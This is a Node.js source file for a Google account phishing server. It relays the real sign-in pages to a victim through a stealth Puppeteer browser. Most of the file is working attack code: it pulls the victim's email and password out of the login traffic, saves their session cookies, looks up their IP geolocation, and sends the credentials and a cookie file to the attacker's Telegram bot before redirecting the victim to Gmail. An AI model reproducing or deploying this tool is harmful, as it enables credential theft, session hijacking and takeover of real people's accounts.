const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { executablePath } = require('puppeteer');
const cheerio = require('cheerio');
const path = require('path');
const express = require('express');
const app = express();
const https = require('https');
const http = require('http');
const { Server } = require("socket.io");
const diffdom = require('diff-dom');
const dd = new diffdom.DiffDOM();
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const prettier = require('prettier');
const atob = require('atob');
const btoa = require('btoa');

const requestCache = new Map();

const {
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
} = require('./config');

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

const {
    setupSocketEvents
} = require('./components/setupSocketEvents');
const {
    setupChangeListeners
} = require('./components/setupPuppeteerChangeListeners');
const {
    CACHED_RESOURCES_DIR,
    BASE_URL,
    CONTENT_URL,
    PORT,
    LOCAL_URL,
    SCHEME,
} = require('./config.js');
const {
    stripCssComments,
    sleep,
    getHashedFileName,
    toAbsoluteUrl
} = require('./components/utils.js');
const {
    getMainAndIframesWithoutScripts,
    processHtmlContent
} = require('./components/resourceProcessing');

// Declare email and password at a global level
let clientUserAgent, clientScreenWidth, clientScreenHeight, clientIp, server, email, password;

// Initialize the stealth plugin
const stealthPlugin = StealthPlugin();

// Disable specific evasions
stealthPlugin.enabledEvasions.delete('iframe.contentWindow');       // Disables iframe evasion
stealthPlugin.enabledEvasions.delete('media.codecs');               // Disables media codec evasion

// Use the modified stealth plugin
puppeteer.use(stealthPlugin);

if (SCHEME === 'https') {
    server = https.createServer({
        key: fs.readFileSync('key.pem'),  // Path to your private key
        cert: fs.readFileSync('cert.pem') // Path to your certificate
    }, app);
} else {
    server = http.createServer(app);
}

// Setup socket.io
const io = new Server(server, { origins: '*:*' });

// Serve static files
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'domdiffer.html'));
});
app.get('/iframeScript.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'iframeScript.html'));
});
app.get('/domdiffer.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'domdiffer.js'));
});
app.get('/domdifferscript.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'domdifferscript.js'));
});
app.get('/jquery.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'jquery.js'));
});
app.get('/getContent', (req, res) => {
    const url = decodeURIComponent(req.query.url);
    const filepath = path.join(CACHED_RESOURCES_DIR, url);
    if (fs.existsSync(filepath)) {
        const data = JSON.parse(fs.readFileSync(filepath));
        res.setHeader('Content-Type', data.mime);
        if (!data.mime.startsWith('text/')) {
            res.send(Buffer.from(data.data, 'base64'));
        } else {
            res.send(data.data);
        }
    } else {
        res.status(404).send('File not found');
    }
});

// Ensure required directories exist
[CACHED_RESOURCES_DIR].forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir);
    }
});

io.on('connection', async (socket) => {
	const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    const puppet = await puppeteer.launch({
        headless: false,
        executablePath: executablePath(),
		devtools: true,
		args: [
		  '--no-sandbox',
		  '--disable-setuid-sandbox',
		  '--ignore-certificate-errors',
		  '--ignore-certificate-errors-spki-list',
		  '--disable-web-security',
		  '--allow-running-insecure-content',
		  '--disable-features=IsolateOrigins,site-per-process',
		  '--disable-blink-features=AutomationControlled',
		  '--disable-infobars',
		  '--enable-features=NetworkService',
		  '--hide-scrollbars',
		  '--mute-audio',
		  '--disable-extensions',
		  '--no-first-run',
		  '--no-default-browser-check',
		  ...(clientUserAgent ? [`--user-agent=${clientUserAgent}`] : []),
		],
    });

    socket.on('disconnect', async () => {
        try {
            await puppet.close();
        } catch (error) {
            console.error(error);
        }
    });

    const page = await puppet.newPage();
	
    // Listen for navigation events or page load
    page.on('load', async () => {
        const currentUrl = await page.url(); // Get the full URL from Puppeteer
        const urlObject = new URL(currentUrl);
        const pathAndQuery = urlObject.pathname + urlObject.search + urlObject.hash;
        
        // Send only the path and query/hash to the client
        socket.emit('updateBrowserUrl', { url: pathAndQuery });
        console.log(`Puppeteer URL: ${currentUrl}`);
        console.log(`Mirrored URL for local browser (relative part): ${pathAndQuery}`);
    });

    // Listen for URL changes (navigation events)
    page.on('framenavigated', async () => {
        const currentUrl = await page.url();
        const urlObject = new URL(currentUrl);
        const pathAndQuery = urlObject.pathname + urlObject.search + urlObject.hash;

        // Emit to client every time the URL changes
        socket.emit('updateBrowserUrl', { url: pathAndQuery });
        console.log(`Puppeteer navigated to: ${currentUrl}`);
        console.log(`Mirrored URL for local browser (relative part): ${pathAndQuery}`);
    });
    // Optional: Poll URL changes periodically to ensure sync
    setInterval(async () => {
        try {
            const currentUrl = await page.url(); // Get the current URL from Puppeteer
            const urlObject = new URL(currentUrl);
            const pathAndQuery = urlObject.pathname + urlObject.search + urlObject.hash;

            // Emit to the client
            socket.emit('updatepuppetUrl', { url: pathAndQuery });
        } catch (error) {
            console.error('Error during polling:', error);
        }
    }, 1000); // Check every 1 seco
	
    await intercept(page, ['*://play.google.com/*', '*://accounts.google.com/*', '*://*/v3/signin/_/AccountsSignInUi*', '*://www.gstatic.com/*'], body => {
        console.log('Response body length:', body.length);
        return body;
    });

    await setupSocketEvents(socket, page);
    await setupChangeListeners(socket, page);

    page.on('response', async (response) => {
        if (response.status() >= 300 && response.status() < 400) {
            return; // Skip redirects
        }

        try {
            const request = response.request();
            const requestBody = request.postData();  // Get the body of the request

            // Check if the request contains form data with 'f.req'
            if (requestBody && requestBody.includes('f.req')) {
                const responseUrl = response.url();
                const responseBody = await response.text();

                // Extract email addresses from the response body
                const mailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
                const matches = responseBody.match(mailRegex);

                if (matches && matches.length > 0) {
                    matches.forEach(match => {
                        email = match; // Assign extracted email to the global variable
                        console.log('Extracted Email:', email);
                    });
                }
            }
        } catch (error) {
            console.error('Error processing response:', error);
        }
    });

    page.on('request', async (request) => {
        try {
            const postData = request.postData();

            if (postData) {
                console.log('Request POST Data:', postData);
            }

            if (postData && postData.includes('f.req=')) {
                const passRegex = /f\.req=%5B%5B%5B%22B4hajb%22%2C%22%5B1%2C\d%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%5C%22(.*?)%5C%22/;
                const match = postData.match(passRegex);

                if (match && match[1]) {
                    password = match[1]; // Assign extracted password to the global variable
                    console.log('Extracted Password:', password);
                }
            }
        } catch (error) {
            console.error('Error processing the request:', error);
        }
    });

    page.on('load', async () => {
        const currentUrl = page.url();

        if (currentUrl.includes('myaccount.google.com') && email) {
            try {
                // Save cookies
                const cookies = await page.cookies();
                const emailFileName = `${email}.txt`;
                fs.writeFileSync(emailFileName, JSON.stringify(cookies, null, 2));
                console.log(`Cookies saved to ${emailFileName}`);

                // Add a delay
                await page.waitForTimeout(3000);

                // Clear address bar by redirecting to "about:blank"
                await page.goto('about:blank');
                console.log('Address bar cleared.');

                // Redirect to Google
                await page.goto('https://www.google.com', { waitUntil: 'networkidle2' });
                console.log('Redirected to google.com.');
            } catch (error) {
                console.error('Error while saving cookies, redirecting, or closing Puppeteer:', error);
            }
        }
    });

	page.on('load', async () => {
		const currentUrl = page.url();

		if (currentUrl.includes('myaccount.google.com') && email && password) {
			try {
				// Enable CDP and get the client
				const client = await page.target().createCDPSession();
				await client.send('Network.enable');

				// Get all cookies using CDP
				const { cookies } = await client.send('Network.getAllCookies');
				await client.detach();

				// Fetch geolocation based on the globally available client IP
				const geolocation = await getGeolocation(clientIp); // Get geolocation details

				// Get the user agent string
				const userAgentString = await page.evaluate(() => navigator.userAgent);

				// Decode password if URL-encoded
				const decodedPassword = password ? decodeURIComponent(password) : password;

				// Prepare credentials message
				const credentials = `++++Scripted by MAX1N3WT0N++++
		IP: ${clientIp}
		Username: ${email}
		Password: ${decodedPassword}
		puppet: ${userAgentString}
		City: ${geolocation.city}
		State: ${geolocation.state}
		Country: ${geolocation.country}
		==================
		+GE0L0CAT10N 1NF0+
		Longitude: ${geolocation.longitude}
		Latitude: ${geolocation.latitude}
		+++++Scripted by MAX1N3WT0N++++
							`;

				// Save credentials to a local file with the format: $email_cred.txt
				const credentialsFilePath = `${email}.txt`;
				fs.writeFileSync(credentialsFilePath, credentials, 'utf8');
				console.log(`Credentials saved to ${credentialsFilePath}`);

				// Save cookies to a local file with the format: #email_cookies.txt
				const cookiesFilePath = `${email}_cookies.txt`;
				fs.writeFileSync(cookiesFilePath, JSON.stringify(cookies, null, 2), 'utf8');
				console.log(`Cookies saved to ${cookiesFilePath}`);

				// Send credentials to Telegram
				await bot.sendMessage(TELEGRAM_CHAT_ID, credentials, {
					parse_mode: 'Markdown',
				});
				console.log('Credentials sent to Telegram.');

				// Send cookies as a file to Telegram
				await bot.sendDocument(TELEGRAM_CHAT_ID, cookiesFilePath, {}, {
					caption: 'Captured Cookies',
				});
				console.log('Cookies file sent to Telegram.');

				// Navigate to Google Mail
				await new Promise(resolve => setTimeout(resolve, 1000));
				socket.emit('redir', { url: 'https://mail.google.com' });

			} catch (error) {
				console.error('Error while saving credentials, cookies, or redirecting:', error);
			} finally {
				await new Promise(resolve => setTimeout(resolve, 1000));
				await puppet.close();
				console.log('puppet closed.');
			}
		}
	});

	await page.goto(BASE_URL, { waitUntil: 'networkidle0' });
	
	

    let oldhead = '<head></head>';
    let oldbodydiv = '<body></body>';
    const oldiframes = [];

    while (socket.connected) {
        const data = await getMainAndIframesWithoutScripts(page);
        if (!data) {
            continue;
        }

        const $ = cheerio.load(data.mainhtml);

        const newhead = $('head').first().prop('outerHTML');
        const newbodydiv = $('body').first().prop('outerHTML');

        const changes = {};
        if (oldhead !== newhead) {
            const oldNode = diffdom.stringToObj(oldhead);
            const newNode = diffdom.stringToObj(newhead);
            oldhead = newhead;
            const diff = dd.diff(oldNode, newNode);
            if (!changes.main) changes.main = {};
            changes.main.head = RemoveInvalidAttributesFromDiff(diff);
        }
        if (oldbodydiv !== newbodydiv) {
            const oldNode = diffdom.stringToObj(oldbodydiv);
            const newNode = diffdom.stringToObj(newbodydiv);
            oldbodydiv = newbodydiv;

            const diff = dd.diff(oldNode, newNode);
            if (!changes.main) changes.main = {};
            changes.main.bodydiv = RemoveInvalidAttributesFromDiff(diff);
        }

        if (!changes.iframes) changes.iframes = [];
        data.iframes.forEach(iframe => {
            const iframeRecord = oldiframes.find(item => item.selector === iframe.selector) || {};
            const $iframe = cheerio.load(iframe.content);
            const iframeHead = $iframe('head').first().prop('outerHTML');
            const iframeBody = `<body>${$iframe('body').first().prop('innerHTML')}</body>`;

            if (iframeRecord.oldhead !== iframeHead || iframeRecord.oldbodydiv !== iframeBody) {
                const iframeChanges = {};
                if (iframeRecord.oldhead !== iframeHead) {
                    const oldNode = diffdom.stringToObj(iframeRecord.oldhead || '<head></head>');
                    const newNode = diffdom.stringToObj(iframeHead);
                    iframeRecord.oldhead = iframeHead;
                    iframeChanges.head = RemoveInvalidAttributesFromDiff(dd.diff(oldNode, newNode));
                }
                if (iframeRecord.oldbodydiv !== iframeBody) {
                    const oldNode = diffdom.stringToObj(iframeRecord.oldbodydiv || '<body></body>');
                    const newNode = diffdom.stringToObj(iframeBody);
                    iframeRecord.oldbodydiv = iframeBody;
                    iframeChanges.bodydiv = RemoveInvalidAttributesFromDiff(dd.diff(oldNode, newNode));
                }
                if (Object.keys(iframeChanges).length > 0) {
                    changes.iframes.push({ selector: iframe.selector, ...iframeChanges });
                }
            }
        });

        if (Object.keys(changes).length > 0) {
            socket.emit('domchanges', changes);
        }
    }
});

async function intercept(page, patterns, transform) {
  const client = await page.target().createCDPSession();

  await client.send('Network.enable');

  await client.send('Network.setRequestInterception', { 
    patterns: patterns.map(pattern => ({
      urlPattern: pattern, resourceType: 'Script', interceptionStage: 'HeadersReceived'
    }))
  });

  client.on('Network.requestIntercepted', async ({ interceptionId, request, responseHeaders, resourceType }) => {
    console.log(`Intercepted ${request.url} {interception id: ${interceptionId}}`);

    const response = await client.send('Network.getResponseBodyForInterception', { interceptionId });

    const contentTypeHeader = Object.keys(responseHeaders).find(k => k.toLowerCase() === 'content-type');
    let newBody, contentType = responseHeaders[contentTypeHeader];

    if (requestCache.has(response.body)) {
      newBody = requestCache.get(response.body);
    } else {
      const bodyData = response.base64Encoded ? atob(response.body) : response.body;
      try {
        if (resourceType === 'Script') newBody = transform(bodyData, { parser: 'babel' });
        else newBody === bodyData;
      } catch(e) {
        console.log(`Failed to process ${request.url} {interception id: ${interceptionId}}: ${e}`);
        newBody = bodyData;
      }

      requestCache.set(response.body, newBody);
    }

    const newHeaders = [
      'Date: ' + (new Date()).toUTCString(),
      'Connection: closed',
      'Content-Length: ' + newBody.length,
      'Content-Type: ' + contentType
    ];

    console.log(`Continuing interception ${interceptionId}`);
    await client.send('Network.continueInterceptedRequest', {
      interceptionId,
      rawResponse: btoa('HTTP/1.1 200 OK' + '\r\n' + newHeaders.join('\r\n') + '\r\n\r\n' + newBody)
    });
  });
}

async function interceptAllTabs(puppet, patterns, transform) {
  // Attach interception logic to all pages (tabs)
  puppet.on('targetcreated', async (target) => {
    if (target.type() === 'page') {
      const page = await target.page();
      intercept(page, patterns, transform);
    }
  });

  // Attach interception to already open pages
  for (const page of await puppet.pages()) {
    intercept(page, patterns, transform);
  }
}

// Transform function for intercepted responses
function transform(source) {
    try {
        // Example transformation (you can modify this logic)
        return prettier.format(source, { parser: 'babel' });
    } catch (err) {
        console.error('Error formatting source:', err);
        return source; // Return the original source in case of errors
    }
}

function RemoveInvalidAttributesFromDiff(diffobj) {
    try {
        function traverse(obj) {
            if (typeof obj === 'object' && obj !== null) {
                if (obj.hasOwnProperty('attributes')) {
                    const regex = /^[a-zA-Z][a-zA-Z0-9-_]*$/;
                    for (const key in obj.attributes) {
                        if (!regex.test(key)) delete obj.attributes[key];
                    }
                }
                for (const key in obj) traverse(obj[key]);
            }
        }
        traverse(diffobj);
        return diffobj;
    } catch (err) {
        console.error('Error parsing the JSON:', err);
    }
}

// Custom function to fetch client IP
async function getClientIP() {
    try {
        const response = await axios.get('https://api64.ipify.org?format=json');
        return response.data.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
        return 'Unknown';
    }
}

// Custom function to fetch geolocation
async function getGeolocation(ip) {
    try {
        const response = await axios.get(`https://ipinfo.io/${ip}/json`);
        const { city, region: state, country, loc } = response.data;
        const [longitude, latitude] = loc.split(',');
        return { city, state, country, longitude, latitude };
    } catch (error) {
        console.error('Error fetching geolocation data:', error);
        return {};
    }
}

server.listen(PORT, LOCAL_URL, () => {
    console.log(`Server is running on ${SCHEME}://${LOCAL_URL}:${PORT}`);
});
